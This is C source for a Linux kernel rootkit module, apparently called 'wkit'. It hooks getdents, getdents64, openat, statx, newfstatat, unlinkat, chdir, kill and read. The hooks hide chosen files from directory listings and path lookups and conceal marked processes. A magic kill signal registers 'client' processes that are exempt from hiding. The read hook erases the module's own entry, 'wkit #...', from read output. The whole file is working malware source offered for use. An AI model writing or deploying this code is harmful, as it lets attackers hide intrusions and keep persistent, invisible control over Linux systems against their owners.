#include <linux/module.h>
#include <linux/dirent.h>
#include <linux/slab.h>
#include <linux/init.h>
#include <linux/errno.h>

#include "calls.h"
#include "config.h"

asmlinkage long h_getdents64(const struct pt_regs* regs){
	int ret;
	unsigned long offset = 0;
	struct linux_dirent64 *curr, *ker, *prev = NULL;
	struct linux_dirent64 __user *usr = (struct linux_dirent64 *)regs->si;
	
	syscall o_getdents64 = find_org("getdents64");
	if(o_getdents64 == 0) return -1;

	ret = o_getdents64(regs);
	if(check_client())
		return ret;

	ker = kmalloc(ret, GFP_KERNEL);

	if((ret <= 0) || (ker == NULL) )
		return ret;

	if(copy_from_user(ker, usr, ret))
    goto DONE;

	while(offset < ret){
		curr = (void*)ker+offset;
		if(!check_file(curr->d_name)){
			prev = curr;
			offset += curr->d_reclen;
			continue;
		}

		if(curr==ker){
			ret -= curr->d_reclen;
			memmove(curr, (void *)curr + curr->d_reclen, ret);
			continue;
		}

		prev->d_reclen += curr->d_reclen;
		offset += curr->d_reclen;
	}

	copy_to_user(usr, ker, ret);
DONE:
	kfree(ker);
	return ret;
}

asmlinkage long h_getdents(const struct pt_regs* regs){
	print("getdents call");
	struct linux_dirent {
		unsigned long		d_ino;
		unsigned long		d_offset;
		unsigned short	d_reclen;
		char						d_name[];
	};

	int ret;
	unsigned long offset = 0;
	struct linux_dirent *curr, *ker, *prev = NULL;
	struct linux_dirent __user *usr = (struct linux_dirent *)regs->si;
	
	syscall o_getdents = find_org("getdents");
	if(o_getdents == 0) return -1;
	
	ret = o_getdents(regs);
	if(check_client())
		return ret;
	
	ker = kzalloc(ret, GFP_KERNEL);

	if((ret <= 0) || (ker == NULL) )
		return ret;

	if(copy_from_user(ker, usr, ret))
    goto DONE;

	while(offset < ret){
		curr = (void*)ker+offset;
		if(!check_file(curr->d_name)){
			prev = curr;
			offset += curr->d_reclen;
			continue;
		}

		if(curr==ker){
			ret -= curr->d_reclen;
			memmove(curr, (void *)curr + curr->d_reclen, ret);
			continue;
		}

		prev->d_reclen += curr->d_reclen;
		offset += curr->d_reclen;
	}

	copy_to_user(usr, ker, ret);
DONE:
	kfree(ker);
	return ret;
}

asmlinkage long h_openat(const struct pt_regs* regs){
	syscall o_openat = find_org("openat");
	char __user *pth = (char*)regs->si;
	int pth_len = strnlen_user(pth, PATH_MAX);
	char* ker_pth;
	
	if(o_openat == 0) return -1;
	if(check_client())
		return o_openat(regs);
	
	ker_pth = kmalloc(pth_len, GFP_KERNEL);
	if(copy_from_user(ker_pth, pth, pth_len))	
		return o_openat(regs);

	if(!check_file(ker_pth)){
		kfree(ker_pth);
		return o_openat(regs);
	}

	kfree(ker_pth);
	return -ENOENT;
};

asmlinkage long h_statx(const struct pt_regs* regs){
	syscall o_statx = find_org("statx");
	char __user *pth = (char*)regs->si;
	int pth_len = strnlen_user(pth, PATH_MAX);
	char* ker_pth;
	
	if(o_statx == 0) return -1;
	if(check_client())
		return o_statx(regs);
	
	ker_pth = kmalloc(pth_len, GFP_KERNEL);
	if(copy_from_user(ker_pth, pth, pth_len))	
		return o_statx(regs);

	if(!check_file(ker_pth)){
		kfree(ker_pth);
		return o_statx(regs);
	}

	kfree(ker_pth);
	return -ENOENT;
};

asmlinkage long h_newfstatat(const struct pt_regs* regs){
	syscall o_newfstatat = find_org("newfstatat");
	char __user *pth = (char*)regs->si;
	int pth_len = strnlen_user(pth, PATH_MAX);
	char* ker_pth;
	
	if(o_newfstatat == 0) return -1;
	if(check_client())
		return o_newfstatat(regs);
	
	ker_pth = kmalloc(pth_len, GFP_KERNEL);
	if(copy_from_user(ker_pth, pth, pth_len))	
		return o_newfstatat(regs);

	if(!check_file(ker_pth)){
		kfree(ker_pth);
		return o_newfstatat(regs);
	}

	kfree(ker_pth);
	return -ENOENT;
};

asmlinkage long h_unlinkat(const struct pt_regs* regs){
	syscall o_unlinkat = find_org("unlinkat");
	char __user *pth = (char*)regs->si;
	int pth_len = strnlen_user(pth, PATH_MAX);
	char* ker_pth;
	
	if(o_unlinkat == 0) return -1;
	if(check_client())
		return o_unlinkat(regs);
	
	ker_pth = kmalloc(pth_len, GFP_KERNEL);
	if(copy_from_user(ker_pth, pth, pth_len))	
		return o_unlinkat(regs);

	if(!check_file(ker_pth)){
		kfree(ker_pth);
		return o_unlinkat(regs);
	}

	kfree(ker_pth);
	return -ENOENT;
};

asmlinkage long h_chdir(const struct pt_regs* regs){
	syscall o_chdir = find_org("chdir");
	char __user *pth = (char*)regs->di;
	int pth_len = strnlen_user(pth, PATH_MAX);
	char* ker_pth;

	if(o_chdir == 0) return -1;
	if(check_client())
		return o_chdir(regs);
	
	ker_pth = kmalloc(pth_len, GFP_KERNEL);
	if(copy_from_user(ker_pth, pth, pth_len))	
		return o_chdir(regs);

	if(!check_file(ker_pth)){
		kfree(ker_pth);
		return o_chdir(regs);
	}

	kfree(ker_pth);
	return -ENOENT;
}

asmlinkage long h_kill(const struct pt_regs* regs){
	syscall o_kill = find_org("kill");
	int sig = regs->si, i = 0;
	pid_t pid = regs->di;
	
	if(o_kill == 0) return -1;
	if(check_client())
		return o_kill(regs);

	if(sig == client_signal){
		char pidstr[50];
		sprintf(pidstr, "%d", pid);
		add_proc(pidstr, true);
		return 0;
	}

	if(procs_count == 0 || procs == NULL)
		return o_kill(regs);

	for(; i<procs_count;i++){
		if(!procs[i].hidden && !procs[i].is_client) continue;
		if(procs[i].pid == pid) return -ESRCH;
	}
	
	return o_kill(regs);
}

asmlinkage long h_read(const struct pt_regs* regs){
	syscall o_read = find_org("read");
	int buflen = (char*)regs->dx;
	char __user *usrbuf = (char*)regs->si;
	char* kerbuf; 
	int res;

	if(o_read == 0) return -1;
	res = o_read(regs);
	if(check_client())
		return res;
	
	kerbuf = kmalloc(buflen, GFP_KERNEL);
	if(copy_from_user(kerbuf, usrbuf, buflen))	
		return res;

	char module_string[USUM_LEN+10];
	sprintf(module_string, "wkit #%s\n", usum);
	if(!contains(kerbuf, module_string)) goto END;
	if(!remove_sub(kerbuf, module_string)) goto END; 

	res = strlen(kerbuf);
	copy_to_user(usrbuf, kerbuf, res);
	kfree(kerbuf);
	return res;

END:
	kfree(kerbuf);
	return res;
}
